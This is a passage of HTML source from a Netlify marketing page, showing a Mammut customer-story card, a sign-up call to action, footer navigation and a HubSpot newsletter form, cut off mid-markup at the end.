                                                        <symbol id="ai:local:arrow" viewBox="0 0 448 512">
                                                            <path fill="currentcolor" d="M438.6 278.6c12.5-12.5 12.5-32.8 0-45.3l-160-160c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3L338.8 224H32c-17.7 0-32 14.3-32 32s14.3 32 32 32h306.7L233.4 393.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l160-160z"></path>
                                                        </symbol>
                                                        <use href="#ai:local:arrow"></use>
                                                    </svg>
                                                </span>
                                            </a>
                                        </li>
                                    </ul>
                                </div>
                            </section>
                        </div>
                    </div>
                </section>
                <section class="pancake | l-section" data-sb-field-path="GZpQT76vrL14dXDLi338hK:pancakes.5" data-astro-cid-5mutinvq="" style="--breakout-area: content;">
                    <picture class="pancake-graphics" data-options="" data-astro-cid-5mutinvq="true" data-astro-cid-dxfgtee3="" style="--graphic-object-fit: cover;"></picture>
                    <div class="pancake-content | l-stack l-stack-medium" data-astro-cid-5mutinvq="" style="--breakout-area: content;">
                        <div class="ingredient l-breakout ingredient-customer-story-card" data-astro-cid-gfez5emt="" style="">
                            <article class="customer-story-wrapper | card l-sidebar-first" data-sb-field-path=".ingredients.0" data-astro-cid-m42fwbq7="">
                                <section class="l-stack" data-theme="dark" data-astro-cid-m42fwbq7="">
                                    <figure class="company-logos" data-astro-cid-skr6yf22="">
                                        <img src="/assets/logos/full/small/lightmode/logo-netlify-small-monochrome-lightmode.svg" alt="Netlify" data-astro-cid-skr6yf22="true" data-astro-cid-jbhojhg7="true" loading="lazy" decoding="async" fetchpriority="auto" width="108" height="43" class="company-logo">
                                        <span class="separator" data-astro-cid-skr6yf22=""></span>
                                        <img src="/_astro/a0b089cda9284482a2a0e140b74986a2afde4c47-149x19_1ByVDe.svg" alt="Mammut logo" data-sb-field-path=".logo" data-astro-cid-skr6yf22="true" data-astro-cid-jbhojhg7="true" loading="lazy" decoding="async" fetchpriority="auto" width="149" height="19" class="company-logo">
                                    </figure>
                                    <ul class="l-grid checklist" data-sb-field-path=".list.items" data-astro-cid-gt4yj4lj="" style="">
                                        <li data-sb-field-path=".0.content" data-astro-cid-gt4yj4lj="" style="">
                                            <div class="prose l-stack l-stack-medium" data-sb-field-path=".0.content" _key="317e465bd279" _type="markdownBlock" data-astro-cid-gt4yj4lj="true" data-astro-cid-cnvtppup="" style="">
                                                <p>Increase in developer productivity</p>
                                            </div>
                                        </li>
                                        <li data-sb-field-path=".1.content" data-astro-cid-gt4yj4lj="" style="">
                                            <div class="prose l-stack l-stack-medium" data-sb-field-path=".0.content" _key="5be70285f166" _type="markdownBlock" data-astro-cid-gt4yj4lj="true" data-astro-cid-cnvtppup="" style="">
                                                <p>Increase in site reliability</p>
                                            </div>
                                        </li>
                                        <li data-sb-field-path=".2.content" data-astro-cid-gt4yj4lj="" style="">
                                            <div class="prose l-stack l-stack-medium" data-sb-field-path=".0.content" _key="fb6e4f44fbf5" _type="markdownBlock" data-astro-cid-gt4yj4lj="true" data-astro-cid-cnvtppup="" style="">
                                                <p>Quality on par with extremely high standards</p>
                                            </div>
                                        </li>
                                    </ul>
                                </section>
                                <section class="l-stack" data-astro-cid-m42fwbq7="">
                                    <div class="c-badge" data-mode="light" data-type="light" data-color="blue" data-astro-cid-m42fwbq7="">Customer story</div>
                                    <h2 class="heading text-1" data-sb-field-path=".heading" data-astro-cid-m42fwbq7="">Mammut means quality - in brand and in technology </h2>
                                    <div class="prose l-stack" data-sb-field-path=".supporting" data-astro-cid-m42fwbq7="true" data-astro-cid-cnvtppup="" style="">
                                        <p>Mammut came to Netlify because they needed a performant, interoperable Composable Web Platform that could deliver a best-in-class digital brand experience for their customers. They needed a partner that could keep their site reliable and performant during peak retail season and unexpected traffic spikes.</p>
                                    </div>
                                    <div data-astro-cid-m42fwbq7="">
                                        <a data-type="text" data-icon-position="inline-end" data-inline-icon="true" data-icon-only="false" data-icon-name="arrow" id="cta-view-the-story" data-sb-field-path=".cta" href="/mammut/" data-astro-cid-m42fwbq7="true" data-astro-cid-tcbm7f7q="true" class="button cta-arrow-link">
                                            <span data-astro-cid-tcbm7f7q="true">View the story</span>
                                            <span class="icon-wrapper" data-astro-cid-tcbm7f7q="true">
                                                <svg width="0.88em" height="1em" viewBox="0 0 448 512" aria-hidden="true" data-astro-cid-tcbm7f7q="true" data-astro-cid-patnjmll="true" class="icon" data-icon="arrow">
                                                    <use href="#ai:local:arrow"></use>
                                                </svg>
                                            </span>
                                        </a>
                                    </div>
                                </section>
                            </article>
                        </div>
                    </div>
                </section>
                <section class="pancake | l-section pancake-margin-top-override" data-sb-field-path="GZpQT76vrL14dXDLi338hK:pancakes.6" data-astro-cid-5mutinvq="" style="--breakout-area: content;--margin-block-start: var(--space-3xl);">
                    <div class="pancake-content | l-stack l-stack-xl" data-astro-cid-5mutinvq="" style="--breakout-area: content;--margin-block-start: var(--space-3xl);">
                        <div class="ingredient l-breakout ingredient-heading" data-astro-cid-gfez5emt="" style="">
                            <h2 data-sb-field-path=".ingredients.0" data-astro-cid-u4qoyrkz="true" class="heading l-stack l-stack-3xs font-heading text-4 font-bold text-center">
                                <span data-astro-cid-u4qoyrkz="" style="">Ready to try Netlify?</span>
                            </h2>
                        </div>
                        <div class="ingredient l-breakout ingredient-call-to-action-group" data-astro-cid-gfez5emt="" style="">
                            <div class="cta-group | l-cluster" data-sb-field-path=".ingredients.1" data-cta-min-width="false" data-astro-cid-sc466a3x="" style="--cluster-justify: center;--cluster-gap: var(undefined);--cta-min-width: auto;">
                                <a class="button" data-type="primary" id="cta-readyToTryNetlify-deployNow" href="https://app.netlify.com/signup?__hstc=6236844.cb5c59c87f8b0991a4f62ebe318c1f03.1758107903193.1758107903193.1758107903193.1&amp;__hssc=6236844.1.1758107903193&amp;__hsfp=2541287795" data-sb-field-path=".items.0" data-astro-cid-sc466a3x="true">Deploy now</a>
                            </div>
                        </div>
                    </div>
                </section>
            </div>
        </main>
        <footer class="site-footer | l-breakout l-stack" data-astro-cid-gcn2mc3v="">
            <div class="wrapper | l-cluster" data-astro-cid-7kdedvnl="">
                <a href="/" id="cta-footer-netlifyLogo" data-astro-cid-3ynf2cxt="">
                    <span class="visually-hidden" data-astro-cid-3ynf2cxt="">Go to Netlify homepage</span>
                    <svg class="logo" width="128" height="113" viewBox="0 0 128 113" fill="none" xmlns="http://www.w3.org/2000/svg" data-astro-cid-3ynf2cxt="">
                        <g clip-path="url(#clip0_236_138)" data-astro-cid-3ynf2cxt="">
                            <path d="M34.593 94.0509H33.3844L27.3514 88.0179V86.8094L36.5743 77.5866H42.9639L43.8158 78.4385V84.8281L34.593 94.0509Z" fill="#05BDBA" class="spark" data-astro-cid-3ynf2cxt=""></path>
                            <path d="M27.3514 25.816V24.6074L33.3844 18.5744H34.593L43.8158 27.7972V34.1868L42.9639 35.0388H36.5743L27.3514 25.816Z" class="spark" data-astro-cid-3ynf2cxt=""></path>
                            <path d="M35.8412 61.4491H0.73307L0 60.716V51.9192L0.73307 51.1861H35.8412L36.5743 51.9192V60.716L35.8412 61.4491Z" class="spark" data-astro-cid-3ynf2cxt=""></path>
                            <path d="M127.277 61.4491H92.1687L91.4356 60.716V51.9192L92.1687 51.1861H127.277L128.01 51.9192V60.716L127.277 61.4491Z" class="spark" data-astro-cid-3ynf2cxt=""></path>
                            <path d="M58.9428 27.0642V0.73307L59.6759 0H68.4727L69.2058 0.73307V27.0642L68.4727 27.7972H59.6759L58.9428 27.0642Z" class="spark" data-astro-cid-3ynf2cxt=""></path>
                            <path d="M58.9428 111.902V85.5711L59.6759 84.838H68.4727L69.2058 85.5711V111.902L68.4727 112.635H59.6759L58.9428 111.902Z" class="spark" data-astro-cid-3ynf2cxt=""></path>
                            <path d="M80.4594 74.6047H71.6824L70.9493 73.8717V53.3259C70.9493 49.6705 69.5129 46.8372 65.1046 46.7382C62.836 46.6787 60.2405 46.7382 57.4668 46.8471L57.0507 47.2731V73.8618L56.3176 74.5948H47.5406L46.8075 73.8618V38.7636L47.5406 38.0305H67.2939C74.9713 38.0305 81.1925 44.2517 81.1925 51.9291V73.8717L80.4594 74.6047Z" class="text" data-astro-cid-3ynf2cxt=""></path>
                        </g>
                        <defs data-astro-cid-3ynf2cxt="">
                            <clipPath id="clip0_236_138" data-astro-cid-3ynf2cxt="">
                                <rect width="128" height="112.635" fill="white" data-astro-cid-3ynf2cxt=""></rect>
                            </clipPath>
                        </defs>
                    </svg>
                </a>
                <ul role="list" class="social | l-cluster" data-astro-cid-7kdedvnl="">
                    <li data-astro-cid-7kdedvnl="">
                        <a id="cta-footer-git-hub" href="https://github.com/netlify" target="_blank" rel="noopener noreferrer" data-astro-cid-7kdedvnl="">
                            <svg width="20" height="20" class="icon" data-astro-cid-7kdedvnl="true" data-icon="github">
                                <symbol id="ai:local:github" viewBox="0 0 98 96">
                                    <path fill="currentcolor" fill-rule="evenodd" d="M48.854 0C21.839 0 0 22 0 49.217c0 21.756 13.993 40.172 33.405 46.69 2.427.49 3.316-1.059 3.316-2.362 0-1.141-.08-5.052-.08-9.127-13.59 2.934-16.42-5.867-16.42-5.867-2.184-5.704-5.42-7.17-5.42-7.17-4.448-3.015.324-3.015.324-3.015 4.934.326 7.523 5.052 7.523 5.052 4.367 7.496 11.404 5.378 14.235 4.074.404-3.178 1.699-5.378 3.074-6.6-10.839-1.141-22.243-5.378-22.243-24.283 0-5.378 1.94-9.778 5.014-13.2-.485-1.222-2.184-6.275.486-13.038 0 0 4.125-1.304 13.426 5.052a47 47 0 0 1 12.214-1.63c4.125 0 8.33.571 12.213 1.63 9.302-6.356 13.427-5.052 13.427-5.052 2.67 6.763.97 11.816.485 13.038 3.155 3.422 5.015 7.822 5.015 13.2 0 18.905-11.404 23.06-22.324 24.283 1.78 1.548 3.316 4.481 3.316 9.126 0 6.6-.08 11.897-.08 13.526 0 1.304.89 2.853 3.316 2.364 19.412-6.52 33.405-24.935 33.405-46.691C97.707 22 75.788 0 48.854 0" clip-rule="evenodd"></path>
                                </symbol>
                                <use href="#ai:local:github"></use>
                            </svg>
                            <span class="visually-hidden" data-astro-cid-7kdedvnl="">GitHub</span>
                        </a>
                    </li>
                    <li data-astro-cid-7kdedvnl="">
                        <a id="cta-footer-linked-in" href="https://www.linkedin.com/company/netlify" target="_blank" rel="noopener noreferrer" data-astro-cid-7kdedvnl="">
                            <svg width="20" height="20" class="icon" data-astro-cid-7kdedvnl="true" data-icon="linkedin">
                                <symbol id="ai:local:linkedin" viewBox="0 0 448 512">
                                    <path fill="currentcolor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5m282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9z"></path>
                                </symbol>
                                <use href="#ai:local:linkedin"></use>
                            </svg>
                            <span class="visually-hidden" data-astro-cid-7kdedvnl="">LinkedIn</span>
                        </a>
                    </li>
                    <li data-astro-cid-7kdedvnl="">
                        <a id="cta-footer-bluesky" href="https://bsky.app/profile/netlify.com" target="_blank" rel="noopener noreferrer" data-astro-cid-7kdedvnl="">
                            <svg width="20" height="20" class="icon" data-astro-cid-7kdedvnl="true" data-icon="bluesky">
                                <symbol id="ai:local:bluesky" viewBox="0 0 600 530">
                                    <path fill="currentColor" d="M135.72 44.03C202.216 93.951 273.74 195.17 300 249.49c26.262-54.316 97.782-155.54 164.28-205.46C512.26 8.009 590-19.862 590 68.825c0 17.712-10.155 148.79-16.111 170.07-20.703 73.984-96.144 92.854-163.25 81.433 117.3 19.964 147.14 86.092 82.697 152.22-122.39 125.59-175.91-31.511-189.63-71.766-2.514-7.38-3.69-10.832-3.708-7.896-.017-2.936-1.193.516-3.707 7.896-13.714 40.255-67.233 197.36-189.63 71.766-64.444-66.128-34.605-132.26 82.697-152.22-67.108 11.421-142.55-7.45-163.25-81.433C20.15 217.613 9.997 86.535 9.997 68.825c0-88.687 77.742-60.816 125.72-24.795z"></path>
                                </symbol>
                                <use href="#ai:local:bluesky"></use>
                            </svg>
                            <span class="visually-hidden" data-astro-cid-7kdedvnl="">Bluesky</span>
                        </a>
                    </li>
                    <li data-astro-cid-7kdedvnl="">
                        <a id="cta-footer-x-formerly-known-as-twitter" href="https://twitter.com/netlify" target="_blank" rel="noopener noreferrer" data-astro-cid-7kdedvnl="">
                            <svg width="20" height="20" class="icon" data-astro-cid-7kdedvnl="true" data-icon="twitter">
                                <symbol id="ai:local:twitter" viewBox="0 0 512 512">
                                    <style>
                                        @keyframes appear {
                                            0% {
                                                opacity: 0;
                                                transform: scale3d(.3,.3,.3)
                                            }

                                            20% {
                                                opacity: 1;
                                                transform: scale3d(1.1,1.1,1.1)
                                            }

                                            40% {
                                                transform: scale3d(.9,.9,.9)
                                            }

                                            60% {
                                                transform: scale3d(1.03,1.03,1.03)
                                            }

                                            80% {
                                                transform: scale3d(.97,.97,.97)
                                            }

                                            to {
                                                transform: scale3d(1.001,1.001,1.001)
                                            }
                                        }
                                    </style>
                                    <path fill="currentcolor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8l164.9-188.5L26.8 48h145.6l100.5 132.9zm-24.8 373.8h39.1L151.1 88h-42z" class="icon-twitter-x"></path>
                                </symbol>
                                <use href="#ai:local:twitter"></use>
                            </svg>
                            <span class="visually-hidden" data-astro-cid-7kdedvnl="">X (formerly known as Twitter)</span>
                        </a>
                    </li>
                    <li data-astro-cid-7kdedvnl="">
                        <a id="cta-footer-you-tube" href="https://www.youtube.com/@NetlifyApp" target="_blank" rel="noopener noreferrer" data-astro-cid-7kdedvnl="">
                            <svg width="20" height="20" class="icon" data-astro-cid-7kdedvnl="true" data-icon="youtube">
                                <symbol id="ai:local:youtube" viewBox="0 0 22 16">
                                    <path fill="currentcolor" d="M10.994.524s-6.508 0-8.142.435c-.874.25-1.594.99-1.839 1.9C.59 4.536.59 8.007.59 8.007s0 3.484.424 5.134c.245.91.952 1.636 1.84 1.887 1.646.448 8.14.448 8.14.448s6.521 0 8.155-.435a2.62 2.62 0 0 0 1.826-1.887c.437-1.663.437-5.134.437-5.134s.013-3.484-.437-5.16A2.6 2.6 0 0 0 19.148.984c-1.634-.46-8.154-.46-8.154-.46M8.923 4.8l5.415 3.207L8.923 11.2z"></path>
                                </symbol>
                                <use href="#ai:local:youtube"></use>
                            </svg>
                            <span class="visually-hidden" data-astro-cid-7kdedvnl="">YouTube</span>
                        </a>
                    </li>
                    <li data-astro-cid-7kdedvnl="">
                        <a id="cta-footer-discourse" href="https://answers.netlify.com/?__hstc=6236844.cb5c59c87f8b0991a4f62ebe318c1f03.1758107903193.1758107903193.1758107903193.1&amp;__hssc=6236844.1.1758107903193&amp;__hsfp=2541287795" target="_blank" rel="noopener noreferrer" data-astro-cid-7kdedvnl="">
                            <svg width="20" height="20" class="icon" data-astro-cid-7kdedvnl="true" data-icon="discourse">
                                <symbol id="ai:local:discourse" viewBox="0 0 24 24">
                                    <path fill="currentcolor" d="M12.103 0C18.666 0 24 5.485 24 11.997c0 6.51-5.33 11.99-11.9 11.99L0 24V11.79C0 5.28 5.532 0 12.103 0m.116 4.563a7.4 7.4 0 0 0-6.337 3.57 7.25 7.25 0 0 0-.148 7.22L4.4 19.61l4.794-1.074a7.42 7.42 0 0 0 8.136-1.39 7.26 7.26 0 0 0 1.737-7.997 7.375 7.375 0 0 0-6.84-4.585z"></path>
                                </symbol>
                                <use href="#ai:local:discourse"></use>
                            </svg>
                            <span class="visually-hidden" data-astro-cid-7kdedvnl="">Discourse</span>
                        </a>
                    </li>
                </ul>
            </div>
            <nav data-astro-cid-goxdehyl="">
                <details class="section l-stack" data-variant="narrow" data-astro-cid-goxdehyl="">
                    <summary data-astro-cid-goxdehyl="">
                        <h2 class="text-0 font-bold tracking-tight" data-astro-cid-goxdehyl="">Products</h2>
                        <svg width="1em" height="1em" viewBox="0 0 512 512" class="icon icon-chevron" aria-hidden="true" data-astro-cid-goxdehyl="true" data-icon="chevron">
                            <use href="#ai:local:chevron"></use>
                        </svg>
                    </summary>
                    <ul class="l-stack l-stack-xs" role="list">
                        <li>
                            <a id="cta-footer-sm-products-deploy-previews" href="/platform/core/deploy-previews/">Deploy Previews </a>
                        </li>
                        <li>
                            <a id="cta-footer-sm-products-functions" href="/platform/core/functions/">Functions </a>
                        </li>
                        <li>
                            <a id="cta-footer-sm-products-primitives" href="/platform/primitives/">Primitives </a>
                        </li>
                        <li>
                            <a id="cta-footer-sm-products-visual-editor" href="/platform/create/">Visual Editor </a>
                        </li>
                        <li>
                            <a id="cta-footer-sm-products-security" href="/security/">Security </a>
                        </li>
                        <li>
                            <a id="cta-footer-sm-products-netlify-cli" href="https://docs.netlify.com/api-and-cli-guides/cli-guides/get-started-with-cli/?__hstc=6236844.cb5c59c87f8b0991a4f62ebe318c1f03.1758107903193.1758107903193.1758107903193.1&amp;__hssc=6236844.1.1758107903193&amp;__hsfp=2541287795">Netlify CLI </a>
                        </li>
                        <li>
                            <a id="cta-footer-sm-products-netlify-sdk" href="https://developers.netlify.com/sdk/get-started/introduction/?__hstc=6236844.cb5c59c87f8b0991a4f62ebe318c1f03.1758107903193.1758107903193.1758107903193.1&amp;__hssc=6236844.1.1758107903193&amp;__hsfp=2541287795">Netlify SDK </a>
                        </li>
                        <li>
                            <a id="cta-footer-sm-products-pricing" href="/pricing/">Pricing </a>
                        </li>
                    </ul>
                </details>
                <section class="section l-stack" data-variant="wide" data-astro-cid-goxdehyl="">
                    <h2 class="text-0 font-bold tracking-tight" data-astro-cid-goxdehyl="">Products</h2>
                    <ul class="l-stack l-stack-xs" role="list">
                        <li>
                            <a id="cta-footer-products-deploy-previews" href="/platform/core/deploy-previews/">Deploy Previews </a>
                        </li>
                        <li>
                            <a id="cta-footer-products-functions" href="/platform/core/functions/">Functions </a>
                        </li>
                        <li>
                            <a id="cta-footer-products-primitives" href="/platform/primitives/">Primitives </a>
                        </li>
                        <li>
                            <a id="cta-footer-products-visual-editor" href="/platform/create/">Visual Editor </a>
                        </li>
                        <li>
                            <a id="cta-footer-products-security" href="/security/">Security </a>
                        </li>
                        <li>
                            <a id="cta-footer-products-netlify-cli" href="https://docs.netlify.com/api-and-cli-guides/cli-guides/get-started-with-cli/?__hstc=6236844.cb5c59c87f8b0991a4f62ebe318c1f03.1758107903193.1758107903193.1758107903193.1&amp;__hssc=6236844.1.1758107903193&amp;__hsfp=2541287795">Netlify CLI </a>
                        </li>
                        <li>
                            <a id="cta-footer-products-netlify-sdk" href="https://developers.netlify.com/sdk/get-started/introduction/?__hstc=6236844.cb5c59c87f8b0991a4f62ebe318c1f03.1758107903193.1758107903193.1758107903193.1&amp;__hssc=6236844.1.1758107903193&amp;__hsfp=2541287795">Netlify SDK </a>
                        </li>
                        <li>
                            <a id="cta-footer-products-pricing" href="/pricing/">Pricing </a>
                        </li>
                    </ul>
                </section>
                <details class="section l-stack" data-variant="narrow" data-astro-cid-goxdehyl="">
                    <summary data-astro-cid-goxdehyl="">
                        <h2 class="text-0 font-bold tracking-tight" data-astro-cid-goxdehyl="">Resources</h2>
                        <svg width="1em" height="1em" viewBox="0 0 512 512" class="icon icon-chevron" aria-hidden="true" data-astro-cid-goxdehyl="true" data-icon="chevron">
                            <use href="#ai:local:chevron"></use>
                        </svg>
                    </summary>
                    <ul class="l-stack l-stack-xs" role="list">
                        <li>
                            <a id="cta-footer-sm-resources-docs" href="https://docs.netlify.com/?__hstc=6236844.cb5c59c87f8b0991a4f62ebe318c1f03.1758107903193.1758107903193.1758107903193.1&amp;__hssc=6236844.1.1758107903193&amp;__hsfp=2541287795">Docs </a>
                        </li>
                        <li>
                            <a id="cta-footer-sm-resources-status" href="https://netlifystatus.com/">Status </a>
                        </li>
                        <li>
                            <a id="cta-footer-sm-resources-support" href="/support/">Support </a>
                        </li>
                        <li>
                            <a id="cta-footer-sm-resources-developer-guides" href="https://developers.netlify.com/?__hstc=6236844.cb5c59c87f8b0991a4f62ebe318c1f03.1758107903193.1758107903193.1758107903193.1&amp;__hssc=6236844.1.1758107903193&amp;__hsfp=2541287795">Developer guides </a>
                        </li>
                        <li>
                            <a id="cta-footer-sm-resources-changelog" href="/changelog/">Changelog </a>
                        </li>
                        <li>
                            <a id="cta-footer-sm-resources-integrations" href="/integrations/">Integrations </a>
                        </li>
                        <li>
                            <a id="cta-footer-sm-resources-guides" href="/resources/">Guides </a>
                        </li>
                        <li>
                            <a id="cta-footer-sm-resources-hire-an-agency" href="/agency-directory/">Hire an agency </a>
                        </li>
                    </ul>
                </details>
                <section class="section l-stack" data-variant="wide" data-astro-cid-goxdehyl="">
                    <h2 class="text-0 font-bold tracking-tight" data-astro-cid-goxdehyl="">Resources</h2>
                    <ul class="l-stack l-stack-xs" role="list">
                        <li>
                            <a id="cta-footer-resources-docs" href="https://docs.netlify.com/?__hstc=6236844.cb5c59c87f8b0991a4f62ebe318c1f03.1758107903193.1758107903193.1758107903193.1&amp;__hssc=6236844.1.1758107903193&amp;__hsfp=2541287795">Docs </a>
                        </li>
                        <li>
                            <a id="cta-footer-resources-status" href="https://netlifystatus.com/">Status </a>
                        </li>
                        <li>
                            <a id="cta-footer-resources-support" href="/support/">Support </a>
                        </li>
                        <li>
                            <a id="cta-footer-resources-developer-guides" href="https://developers.netlify.com/?__hstc=6236844.cb5c59c87f8b0991a4f62ebe318c1f03.1758107903193.1758107903193.1758107903193.1&amp;__hssc=6236844.1.1758107903193&amp;__hsfp=2541287795">Developer guides </a>
                        </li>
                        <li>
                            <a id="cta-footer-resources-changelog" href="/changelog/">Changelog </a>
                        </li>
                        <li>
                            <a id="cta-footer-resources-integrations" href="/integrations/">Integrations </a>
                        </li>
                        <li>
                            <a id="cta-footer-resources-guides" href="/resources/">Guides </a>
                        </li>
                        <li>
                            <a id="cta-footer-resources-hire-an-agency" href="/agency-directory/">Hire an agency </a>
                        </li>
                    </ul>
                </section>
                <details class="section l-stack" data-variant="narrow" data-astro-cid-goxdehyl="">
                    <summary data-astro-cid-goxdehyl="">
                        <h2 class="text-0 font-bold tracking-tight" data-astro-cid-goxdehyl="">Company</h2>
                        <svg width="1em" height="1em" viewBox="0 0 512 512" class="icon icon-chevron" aria-hidden="true" data-astro-cid-goxdehyl="true" data-icon="chevron">
                            <use href="#ai:local:chevron"></use>
                        </svg>
                    </summary>
                    <ul class="l-stack l-stack-xs" role="list">
                        <li>
                            <a id="cta-footer-sm-company-about" href="/about/">About </a>
                        </li>
                        <li>
                            <a id="cta-footer-sm-company-agent-experience" href="/agent-experience/">Agent Experience </a>
                        </li>
                        <li>
                            <a id="cta-footer-sm-company-blog" href="/blog/">Blog </a>
                        </li>
                        <li>
                            <a id="cta-footer-sm-company-customers" href="/customers/">Customers </a>
                        </li>
                        <li>
                            <a id="cta-footer-sm-company-careers" href="/careers/">Careers </a>
                        </li>
                        <li>
                            <a id="cta-footer-sm-company-press" href="/press/">Press </a>
                        </li>
                    </ul>
                </details>
                <section class="section l-stack" data-variant="wide" data-astro-cid-goxdehyl="">
                    <h2 class="text-0 font-bold tracking-tight" data-astro-cid-goxdehyl="">Company</h2>
                    <ul class="l-stack l-stack-xs" role="list">
                        <li>
                            <a id="cta-footer-company-about" href="/about/">About </a>
                        </li>
                        <li>
                            <a id="cta-footer-company-agent-experience" href="/agent-experience/">Agent Experience </a>
                        </li>
                        <li>
                            <a id="cta-footer-company-blog" href="/blog/">Blog </a>
                        </li>
                        <li>
                            <a id="cta-footer-company-customers" href="/customers/">Customers </a>
                        </li>
                        <li>
                            <a id="cta-footer-company-careers" href="/careers/">Careers </a>
                        </li>
                        <li>
                            <a id="cta-footer-company-press" href="/press/">Press </a>
                        </li>
                    </ul>
                </section>
                <details class="section l-stack" data-variant="narrow" data-astro-cid-goxdehyl="">
                    <summary data-astro-cid-goxdehyl="">
                        <h2 class="text-0 font-bold tracking-tight" data-astro-cid-goxdehyl="">Contact Us</h2>
                        <svg width="1em" height="1em" viewBox="0 0 512 512" class="icon icon-chevron" aria-hidden="true" data-astro-cid-goxdehyl="true" data-icon="chevron">
                            <use href="#ai:local:chevron"></use>
                        </svg>
                    </summary>
                    <ul class="l-stack l-stack-xs" role="list">
                        <li>
                            <a id="cta-footer-sm-contact-us-sales" href="/contact/sales?attr=homepage&amp;ref=sales&amp;id=cta-footer-sales">Sales </a>
                        </li>
                        <li>
                            <a id="cta-footer-sm-contact-us-support" href="/support/">Support </a>
                        </li>
                        <li>
                            <a id="cta-footer-sm-contact-us-status" href="https://netlifystatus.com/">Status </a>
                        </li>
                        <li>
                            <a id="cta-footer-sm-contact-us-forums" href="https://answers.netlify.com/?__hstc=6236844.cb5c59c87f8b0991a4f62ebe318c1f03.1758107903193.1758107903193.1758107903193.1&amp;__hssc=6236844.1.1758107903193&amp;__hsfp=2541287795">Forums </a>
                        </li>
                    </ul>
                </details>
                <section class="section l-stack" data-variant="wide" data-astro-cid-goxdehyl="">
                    <h2 class="text-0 font-bold tracking-tight" data-astro-cid-goxdehyl="">Contact Us</h2>
                    <ul class="l-stack l-stack-xs" role="list">
                        <li>
                            <a id="cta-footer-contact-us-sales" href="/contact/sales?attr=homepage&amp;ref=sales&amp;id=cta-footer-sales">Sales </a>
                        </li>
                        <li>
                            <a id="cta-footer-contact-us-support" href="/support/">Support </a>
                        </li>
                        <li>
                            <a id="cta-footer-contact-us-status" href="https://netlifystatus.com/">Status </a>
                        </li>
                        <li>
                            <a id="cta-footer-contact-us-forums" href="https://answers.netlify.com/?__hstc=6236844.cb5c59c87f8b0991a4f62ebe318c1f03.1758107903193.1758107903193.1758107903193.1&amp;__hssc=6236844.1.1758107903193&amp;__hsfp=2541287795">Forums </a>
                        </li>
                    </ul>
                </section>
            </nav>
            <section class="newsletter-form | l-stack l-stack-small l-center" data-astro-cid-gtbzbcej="">
                <h2 class="text-0" data-astro-cid-gtbzbcej="">Stay up to date with Netlify news</h2>
                <article class="hubspot-form-wrapper | l-overlay-stack l-center">
                    <div id="hubspot-form-site-footer" data-hubspot-form-id="52611e5e-cc55-4960-bf4a-a2adb36291f6"></div>
                    <form method="POST" class="hs-form l-cluster" action="https://www.netlify.com/thanks-for-signing-up/" data-astro-cid-gtbzbcej="true">
                        <div class="hs-form-field">
                            <label for="email">Email</label>
                            <input name="email" id="email" required="" value="" type="email">
                        </div>
                        <div class="hs-form-field" hidden="">
                            <label for="utm_campaign">UTM Campaign</label>
                            <input name="utm_campaign" id="utm_campaign" value="" type="hidden">
                        </div>
                        <div class="hs-form-field" hidden="">
                            <label for="utm_content">UTM Content</label>
                            <input name="utm_content" id="utm_content" value="" type="hidden">
                        </div>
                        <div class="hs-form-field" hidden="">
                            <label for="utm_medium">UTM Medium</label>
                            <input name="utm_medium" id="utm_medium" value="" type="hidden">
                        </div>
                        <div class="hs-form-field" hidden="">
                            <label for="utm_source">UTM Source</label>
                            <input name="utm_source" id="utm_source" value="" type="hidden">
                        </div>
                        <div class="hs-form-field" hidden="">
                            <label for="utm_term">UTM Term</label>
                            <input name="utm_term" id="utm_term" value="" type="hidden">
                        </div>
                        <input type="hidden" name="hubspotformid" value="52611e5e-cc55-4960-bf4a-a2adb36291f6">
                        <input type="hidden" name="hubspotutk" value="">
                        <div class="hs-submit">
                            <input type="submit" data-type="primary" value="Subscribe">
                        </div>
                    </form>
                </article>
                <script>
                    (function() {
                        const hubspotFormId = "52611e5e-cc55-4960-bf4a-a2adb36291f6";
                        const submitBtnVariant = "primary";

                        if (hubspotFormId && submitBtnVariant) {
                            if (window?.hsFormButtons) {
                                window.hsFormButtons[hubspotFormId] = `button-${submitBtnVariant}`;
                            } else {
                                window.hsFormButtons = {
                                    [hubspotFormId]: `button-${submitBtnVariant}`,
                                };
                            }
                        }
                    }
                    )();
                </script>
                <script type="module" src="/_astro/HubSpotForm.astro_astro_type_script_index_0_lang.D8LDcS1S.js"></script>
            </section>
            <div class="wrapper | l-cluster" data-astro-cid-k5rle6j4="">
                <ul role="list" class="legal | l-cluster" data-astro-cid-k5rle6j4="">
                    <li data-astro-cid-k5rle6j4="">
                        <a id="cta-legal-footer-trust-center" href="/trust-center/" data-astro-cid-k5rle6j4="">Trust Center </a>
                    </li>
                    <li data-astro-cid-k5rle6j4="">
                        <a id="cta-legal-footer-privacy" href="/privacy/" data-astro-cid-k5rle6j4="">Privacy </a>
                    </li>
                    <li data-astro-cid-k5rle6j4="">
                        <a id="cta-legal-footer-gdpr-ccpa" href="/gdpr-ccpa/" data-astro-cid-k5rle6j4="">GDPR/CCPA </a>
                    </li>
                    <li data-astro-cid-k5rle6j4="">
                        <a id="cta-legal-footer-abuse" href="mailto:fraud@netlify.com?subject=Abuse%20report&amp;body=Please%20include%20the%20site%20URL%20and%20reason%20for%20your%20report%2C%20and%20we%20will%20reply%20promptly." data-astro-cid-k5rle6j4="">Abuse </a>
                    </li>
                    <li data-astro-cid-k5rle6j4="">
                        <button type="button" id="cta-legal-footer-cookie-settings-toggle" data-type="reset" data-astro-cid-k5rle6j4="">Cookie Settings </button>
                    </li>
                </ul>
                <p class="copyright" data-astro-cid-k5rle6j4="">© 2025 Netlify</p>
            </div>
            <label class="theme-switcher site-theme-select" data-astro-cid-gcn2mc3v="true">
                <span class="visually-hidden">Site theme</span>
                <select id="site-theme-select">
